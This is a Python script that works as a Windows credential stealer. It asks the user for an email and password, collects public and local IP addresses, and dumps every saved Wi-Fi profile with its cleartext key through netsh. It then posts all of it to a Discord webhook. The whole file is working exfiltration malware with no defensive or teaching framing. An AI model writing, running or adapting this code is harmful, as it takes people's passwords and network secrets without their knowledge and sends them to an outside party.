import requests
import subprocess
import json

# Prompt for email and password
email = input("Enter your email: ")
password = input("Enter your password: ")

# Webhook URL
webhook_url = "your discord webhook here"

# Get public IP
pubip = requests.get("https://api.ipify.org").text

# Get IPv4 and IPv6 addresses
def get_ip_addresses():
    ipv4 = ''
    ipv6 = ''
    try:
        ipconfig = subprocess.check_output("ipconfig", text=True)
        for line in ipconfig.splitlines():
            if "IPv4" in line:
                ipv4 = line.split(":")[-1].strip()
            elif "IPv6" in line:
                ipv6 = line.split(":")[-1].strip()
    except Exception as e:
        print(f"Error fetching IP addresses: {e}")
    return ipv4, ipv6

ipv4_addr, ipv6_addr = get_ip_addresses()

# Get Wi-Fi profiles and keys
profiles = []
try:
    output = subprocess.check_output("netsh wlan show profile", text=True)
    for line in output.splitlines():
        if "All User Profile" in line:
            profile_name = line.split(":")[-1].strip()
            profiles.append(profile_name)
except Exception as e:
    print(f"Error fetching Wi-Fi profiles: {e}")

wifi_data = []
for profile in profiles:
    try:
        show_profile = subprocess.check_output(
            f'netsh wlan show profile name="{profile}" key=clear', text=True
        )
        key_content = None
        for line in show_profile.splitlines():
            if "Key Content" in line:
                key_content = line.split(":", 1)[1].strip()
                break
        wifi_data.append({"Profile": profile, "Key": key_content})
    except Exception:
        wifi_data.append({"Profile": profile, "Key": None})

# Prepare the payload
payload_content = (
    f"User Email: {email}\n"
    f"User Password: {password}\n"
    f"Public IP: {pubip}\n"
    f"IPv4 Address: {ipv4_addr}\n"
    f"IPv6 Address: {ipv6_addr}\n"
    "Wi-Fi Profiles and Keys:\n"
)
for wifi in wifi_data:
    key_display = wifi["Key"] if wifi["Key"] else "N/A"
    payload_content += f"Profile: {wifi['Profile']} | Key: {key_display}\n"

payload = {
    "content": payload_content
}

# Send to Discord webhook
try:
    response = requests.post(webhook_url, json=payload)
    if response.status_code == 204:
        print("Payload sent successfully.")
    else:
        print(f"Failed to send payload. Status code: {response.status_code}")
except Exception as e:
    print(f"Error sending payload: {e}")
